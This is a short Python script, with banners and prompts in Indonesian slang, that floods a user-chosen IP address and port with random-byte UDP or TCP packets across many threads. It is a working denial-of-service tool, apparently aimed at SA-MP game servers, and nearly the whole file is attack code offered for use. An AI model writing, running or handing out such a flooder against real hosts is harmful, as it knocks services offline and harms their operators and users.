#!/usr/bin/env python3
import random
import socket
import threading
#14B600
print       (" - - > PO 1 ABADI ! < - - ")
print       (" - - > OWNER FREE ALL SAMP <- - ")                                   
print       (" - - > AWAS LU ABUSE !! < - - ")
print       (" - - > YAHAHA WAHYU < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" PENCET Y (y/n):"))
times = int(input(" PAKET YANG MAU DIKIRIM:"))
threads = int(input(" ISI PAKET:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[P]","[P]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PO 1 ABADI NIH BOSS ")
		except:
			print("[!] K.O")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PO 1 ABADI NIH BOSS  ")
		except:
			s.close()
			print("[*] K.O")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()